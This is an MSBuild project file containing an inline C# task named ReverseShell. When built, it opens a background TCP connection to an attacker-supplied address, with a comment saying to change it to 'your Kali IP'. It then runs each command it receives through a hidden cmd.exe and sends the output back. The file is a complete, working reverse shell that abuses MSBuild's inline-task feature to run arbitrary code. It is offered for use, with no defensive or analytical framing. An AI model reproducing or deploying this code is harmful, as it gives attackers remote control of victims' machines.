<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Connect">
    <ReverseShell />
  </Target>
  
  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory" 
             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Net.Sockets;
        using System.Diagnostics;
        using System.Text;
        using System.IO;
        using System.Threading;

        public class ReverseShell : Microsoft.Build.Utilities.Task {
            public override bool Execute() {
                Thread thread = new Thread(new ThreadStart(StartShell));
                thread.IsBackground = true;
                thread.Start();
                return true;
            }
            
            private void StartShell() {
                string host = "192.168.1.8";  // CHANGE TO YOUR KALI IP
                int port = 4444;
                
                try {
                    // Write debug info
                    File.WriteAllText("C:\\Windows\\Temp\\msbuild.log", "Starting connection to " + host + ":" + port + " at " + DateTime.Now.ToString());
                    
                    using(TcpClient client = new TcpClient(host, port)) {
                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnected successfully!");
                        
                        using(NetworkStream stream = client.GetStream()) {
                            // Send welcome message
                            string welcome = "=== Reverse Shell Connected ===\\n";
                            byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
                            stream.Write(welcomeBytes, 0, welcomeBytes.Length);
                            
                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            
                            while((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0) {
                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
                                
                                if (command == "exit") break;
                                if (string.IsNullOrEmpty(command)) continue;
                                
                                string result = ExecuteCommand(command);
                                byte[] output = Encoding.ASCII.GetBytes(result);
                                stream.Write(output, 0, output.Length);
                                stream.Flush();
                            }
                        }
                    }
                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnection closed normally");
                } catch (Exception ex) {
                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nError: " + ex.Message);
                }
            }
            
            private string ExecuteCommand(string command) {
                try {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    if (!string.IsNullOrEmpty(error)) {
                        output = output + "\\n" + error;
                    }
                    
                    return output;
                } catch (Exception ex) {
                    return "Error executing command: " + ex.Message + "\\n";
                }
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
